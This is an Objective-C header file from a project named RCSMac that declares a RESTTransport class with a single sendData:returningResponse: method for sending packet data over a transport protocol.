//
//  RESTTransport.h
//  RCSMac
//
//  Created by revenge on 1/13/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>
#import "Transport.h"


@interface RESTTransport : NSObject <Transport>
{
}

- (NSData *)sendData: (NSData *)aPacketData
   returningResponse: (NSURLResponse *)aResponse;

@end
